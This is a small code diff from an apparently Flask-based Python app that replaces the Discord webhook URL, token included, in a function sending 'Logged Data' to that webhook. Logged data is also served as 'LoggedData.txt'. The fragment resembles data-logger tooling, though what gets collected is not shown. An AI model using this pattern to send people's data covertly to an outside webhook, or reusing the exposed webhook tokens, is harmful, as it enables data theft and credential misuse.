@@ -22,7 +22,7 @@ def save_data():
     return send_file('LoggedData.txt', attachment_filename='LoggedData.txt')
 
 def send_to_webhook(data):
-    url = 'https://discord.com/api/webhooks/1226794752683409498/ZQ2XsEbXdlK9je7ucPMWJVoBdaOOQs0BgMQPJ2xso3UgrPCqqaFs4k7AADKxJ95OJExB'
+    url = 'https://discord.com/api/webhooks/1229639510888026132/egi6pOOl3j2NboANv7F-nGd9nr-koNxWxXcF-r21LNRM1LjPj8MU6BHIqs8rywFqaeUY'
     payload = {
         'username': 'Logged Data',
         'avatar_url': 'https://example.com/avatar.png',
